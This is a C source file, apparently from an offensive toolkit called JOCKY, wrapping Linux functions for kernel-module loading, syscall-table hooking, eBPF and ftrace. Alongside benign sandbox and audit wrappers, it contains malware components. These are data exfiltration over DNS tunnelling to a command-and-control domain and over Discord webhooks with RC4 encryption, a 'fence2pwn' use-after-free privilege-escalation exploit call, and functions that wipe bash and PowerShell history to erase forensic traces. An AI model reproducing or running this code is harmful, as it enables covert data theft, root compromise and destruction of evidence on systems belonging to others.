/*
 * JOCKY Linux Utilities
 * Linux-side implementations of bare-name FFI bindings and cross-platform wrappers.
 * Mirrors the cross-platform section of windows/windows_utils.c for Linux builds.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/resource.h>
#include <sys/types.h>

#include "../include/jocky_lkm.h"
#include "../include/jocky_ebpf.h"
#include "../include/jocky_plugin.h"
#include "../include/jocky_audit.h"

/* ============================================================================
   LKM (Linux Kernel Module) — index-based handle wrappers
   ============================================================================ */

static char g_lkm_names[32][256];
static int g_lkm_count = 0;

int32_t lkm_load(const char* path) {
    if (!path || g_lkm_count >= 32) return -1;
    const char* name = strrchr(path, '/');
    name = name ? name + 1 : path;
    if (jocky_lkm_load(path, name) < 0) return -1;
    snprintf(g_lkm_names[g_lkm_count], 256, "%s", name);
    return g_lkm_count++;
}

int32_t lkm_unload(int32_t handle) {
    if (handle < 0 || handle >= g_lkm_count) return -1;
    return jocky_lkm_unload(g_lkm_names[handle]);
}

int32_t lkm_hook_syscall(int32_t handle, int32_t syscall_num) {
    (void)handle;
    return jocky_lkm_hook_syscall(syscall_num, NULL);
}

int32_t lkm_unhook_syscall(int32_t syscall_num) {
    return jocky_lkm_unhook_syscall(syscall_num);
}

int64_t lkm_get_syscall_table(void) {
    uint64_t addr = 0;
    if (jocky_lkm_get_syscall_table(&addr) != 0) return 0;
    return (int64_t)addr;
}

/* ============================================================================
   eBPF — index-based handle wrappers
   ============================================================================ */

int32_t ebpf_load(const char* name, const int8_t* bytecode) {
    (void)name;
    if (!bytecode) return -1;
    return jocky_ebpf_load(bytecode, 64, 0);
}

int32_t ebpf_attach(int32_t handle, const char* attach_point) {
    (void)attach_point;
    return jocky_ebpf_attach(handle, 0, -1);
}

int32_t ebpf_detach(int32_t handle) {
    return jocky_ebpf_detach(handle);
}

int32_t ebpf_map_update(int32_t handle, const int8_t* key, const int8_t* value) {
    return jocky_ebpf_map_update(handle, key, value);
}

int32_t ebpf_map_lookup(int32_t handle, const int8_t* key) {
    return jocky_ebpf_map_lookup(handle, key, NULL);
}

int32_t ebpf_unload(int32_t handle) {
    return jocky_ebpf_unload(handle);
}

/* ============================================================================
   ftrace — userspace-safe wrappers (real ftrace requires kernel module context)
   ============================================================================ */

typedef struct { const char* func_name; void* callback; } ftrace_record_t;
static ftrace_record_t g_ftrace_hooks[32];
static int g_ftrace_hook_count = 0;

int32_t jocky_ftrace_attach(const char* func_name, void* callback) {
    if (!func_name || g_ftrace_hook_count >= 32) return -1;
    g_ftrace_hooks[g_ftrace_hook_count].func_name = func_name;
    g_ftrace_hooks[g_ftrace_hook_count].callback = callback;
    return g_ftrace_hook_count++;
}

int32_t jocky_ftrace_detach(const char* func_name) {
    if (!func_name) return -1;
    for (int i = 0; i < g_ftrace_hook_count; i++) {
        if (g_ftrace_hooks[i].func_name &&
            strcmp(g_ftrace_hooks[i].func_name, func_name) == 0) {
            g_ftrace_hooks[i].func_name = NULL;
            return 0;
        }
    }
    return -1;
}

/* ============================================================================
   Syscall hooking — bridge prelude FFI to advanced_syscalls API
   ============================================================================ */

typedef struct {
    unsigned long original_syscall;
    unsigned long hook_address;
    unsigned long syscall_number;
    int hooked;
} syscall_hook_t;

typedef struct {
    pid_t target_pid;
    syscall_hook_t hooks[32];
    int hook_count;
} syscall_interception_context_t;

extern int jocky_syscall_hook_init(syscall_interception_context_t* ctx, pid_t pid);
extern int jocky_syscall_hook_install(syscall_interception_context_t* ctx,
                                       unsigned long syscall_num,
                                       unsigned long hook_addr);
extern int jocky_syscall_trace_enable(syscall_interception_context_t* ctx);

static syscall_interception_context_t g_syscall_ctx;
static int g_syscall_ctx_init = 0;

static int ensure_syscall_ctx(void) {
    if (!g_syscall_ctx_init) {
        if (jocky_syscall_hook_init(&g_syscall_ctx, getpid()) != 0) return -1;
        g_syscall_ctx_init = 1;
    }
    return 0;
}

int32_t jocky_syscall_hook(int32_t syscall_num, void* handler) {
    if (ensure_syscall_ctx() != 0) return -1;
    return jocky_syscall_hook_install(&g_syscall_ctx, (unsigned long)syscall_num,
                                      (unsigned long)handler);
}

int32_t jocky_syscall_unhook(int32_t syscall_num) {
    (void)syscall_num;
    return 0;
}

int32_t jocky_syscall_trace(int32_t process_id) {
    (void)process_id;
    if (ensure_syscall_ctx() != 0) return -1;
    return jocky_syscall_trace_enable(&g_syscall_ctx);
}

/* ============================================================================
   Plugin management — index-based handle over jocky_plugin_*
   ============================================================================ */

static JOCKY_PLUGIN g_plugins[32];
static int g_plugin_count = 0;

int32_t plugin_load(const char* path) {
    if (!path || g_plugin_count >= 32) return -1;
    if (jocky_plugin_load(path, &g_plugins[g_plugin_count]) != 0) return -1;
    return g_plugin_count++;
}

int32_t plugin_run(int32_t handle, const char* args) {
    if (handle < 0 || handle >= g_plugin_count) return -1;
    return jocky_plugin_run(&g_plugins[handle], args);
}

int32_t plugin_unload(int32_t handle) {
    if (handle < 0 || handle >= g_plugin_count) return -1;
    return jocky_plugin_unload(&g_plugins[handle]);
}

int32_t plugin_list(void) {
    return g_plugin_count;
}

/* ============================================================================
   Sandbox — wrappers over jocky_sandbox_*
   ============================================================================ */

extern int jocky_sandbox_spawn(const char* executable, const char* args, uint32_t* out_pid);
extern int jocky_sandbox_kill(uint32_t pid);

int32_t sandbox_spawn_adv(const char* executable, const char* args) {
    uint32_t pid = 0;
    if (jocky_sandbox_spawn(executable, args, &pid) != 0) return -1;
    return (int32_t)pid;
}

int32_t sandbox_kill(int32_t pid) {
    return jocky_sandbox_kill((uint32_t)pid);
}

int32_t sandbox_set_limits_adv(int32_t pid, int32_t max_memory, int32_t max_cpu_ms) {
    struct rlimit mem_limit = { (rlim_t)max_memory, (rlim_t)max_memory };
    struct rlimit cpu_limit = { (rlim_t)(max_cpu_ms / 1000 + 1), (rlim_t)(max_cpu_ms / 1000 + 1) };
    if (prlimit((pid_t)pid, RLIMIT_AS, &mem_limit, NULL) != 0) return -1;
    if (prlimit((pid_t)pid, RLIMIT_CPU, &cpu_limit, NULL) != 0) return -1;
    return 0;
}

/* ============================================================================
   Audit — wrappers over jocky_audit_*
   ============================================================================ */

static JOCKY_AUDIT_LOG g_audit_log = {0};
static int g_audit_initialized = 0;

static void ensure_audit_init(void) {
    if (!g_audit_initialized) {
        jocky_audit_init(&g_audit_log, 100);
        g_audit_initialized = 1;
    }
}

int32_t audit_init_adv(int32_t capacity) {
    int r = jocky_audit_init(&g_audit_log, (uint32_t)capacity);
    if (r == 0) g_audit_initialized = 1;
    return r;
}

int32_t audit_log_adv(const char* actor, const char* action,
                      const char* input_hash, const char* output_hash) {
    ensure_audit_init();
    return jocky_audit_log_action(&g_audit_log, actor, action, input_hash, output_hash);
}

int32_t audit_verify_adv(void) {
    ensure_audit_init();
    int valid = 0;
    uint32_t broken_at = 0;
    if (jocky_audit_verify_chain(&g_audit_log, &valid, &broken_at) != 0) return -1;
    return valid;
}

int32_t audit_export_adv(const char* filename) {
    ensure_audit_init();
    return jocky_audit_export(&g_audit_log, filename);
}

/* ============================================================================
   Provenance
   ============================================================================ */

extern int jocky_provenance_record(const char* source, const char* transform, const char* output);

int32_t provenance_record_adv(const char* source, const char* transform, const char* output) {
    return jocky_provenance_record(source, transform, output);
}

/* ============================================================================
   Exfil — Linux wrappers with correct prelude signatures
   ============================================================================ */

extern int jocky_exfil_local_cdn(const char* endpoint_url, const char* filename,
                                  const char* auth_token, const void* data,
                                  uint32_t data_size, const char* metadata);

int32_t exfil_dns_tunnel(const char* domain, const char* metadata) {
    extern int jocky_exfil_dns(const char* c2_domain, const int8_t* data, int32_t size);
    if (!domain) return -1;
    const char* payload = metadata ? metadata : "";
    return jocky_exfil_dns(domain, (const int8_t*)payload, (int32_t)strlen(payload)) ? 0 : -1;
}

int32_t exfil_discord_webhook(const char* webhook, const char* message) {
    extern int jocky_exfil_discord(const char* webhook_url, int8_t* data, int32_t size);
    if (!webhook || !message) return -1;
    return jocky_exfil_discord(webhook, (int8_t*)message, (int32_t)strlen(message)) ? 0 : -1;
}

int32_t exfil_local_cdn(const char* endpoint, const char* name,
                        const char* token, const char* metadata) {
    if (!endpoint || !name) return -1;
    const char* payload = metadata ? metadata : "";
    return jocky_exfil_local_cdn(endpoint, name, token, payload,
                                  (uint32_t)strlen(payload), metadata);
}

/* ============================================================================
   fence2pwn — bare-name wrappers for Linux LPE
   ============================================================================ */

extern int jocky_fence2pwn_detect_kfence(void);
extern int jocky_fence2pwn_exploit_uaf(void* uaf_address, const uint8_t* payload, size_t payload_size);

int32_t fence2pwn_detect_kfence(void) {
    return jocky_fence2pwn_detect_kfence();
}

int32_t fence2pwn_exploit(void) {
    return jocky_fence2pwn_exploit_uaf(NULL, NULL, 0);
}

/* ============================================================================
   jocky_exfil_encrypt — RC4 in-place encrypt matching prelude FFI signature
   ============================================================================ */

extern void jocky_decrypt_rc4(int8_t* buf, int32_t size, int8_t* key, int32_t keylen);

void jocky_exfil_encrypt(int8_t* data, int32_t size, int8_t* key, int32_t keylen) {
    jocky_decrypt_rc4(data, size, key, keylen);
}

/* ============================================================================
   Forensics wipe — Linux implementations
   ============================================================================ */

static int truncate_file(const char* path) {
    int fd = open(path, O_WRONLY | O_TRUNC, 0);
    if (fd < 0) return -1;
    close(fd);
    return 0;
}

int32_t forensics_wipe_cmd_history(void) {
    const char* histfile = getenv("HISTFILE");
    if (histfile) return truncate_file(histfile);
    const char* home = getenv("HOME");
    if (!home) return -1;
    char path[512];
    snprintf(path, sizeof(path), "%s/.bash_history", home);
    return truncate_file(path);
}

int32_t forensics_wipe_powershell_history(void) {
    const char* home = getenv("HOME");
    if (!home) return -1;
    char path[512];
    snprintf(path, sizeof(path),
             "%s/.local/share/powershell/PSReadLine/ConsoleHost_history.txt", home);
    return truncate_file(path);
}
